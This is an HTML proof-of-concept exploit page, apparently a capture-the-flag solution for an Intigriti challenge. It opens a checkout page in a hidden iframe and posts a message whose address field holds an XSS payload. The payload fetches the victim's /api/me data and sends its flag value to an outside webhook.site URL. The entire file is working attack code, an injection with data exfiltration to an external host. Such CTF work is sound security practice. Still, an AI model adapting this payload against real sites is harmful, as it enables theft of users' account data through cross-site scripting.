<!DOCTYPE html>
<html>
<body>
<script>
// Open checkout page in hidden iframe
const iframe = document.createElement('iframe');
iframe.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1';
iframe.style.display = 'none';
document.body.appendChild(iframe);

iframe.onload = () => {
  setTimeout(() => {
    // Inject XSS payload via postMessage
    iframe.contentWindow.postMessage({
      type: 'submitTransaction',
      transaction: {
        toAddress: '<img/src="x"/onerror="fetch(`/api/me`).then(r=>r.json()).then(d=>fetch(`https://webhook.site/5c699d9b-1a2c-4d4c-a79a-d3f7b3fac905?f=${encodeURIComponent(d.flag)}`))">',
        currency: '1337COIN',
        amount: 0.00000001
      }
    }, '*');
  }, 1000);
};
</script>
</body>
</html>
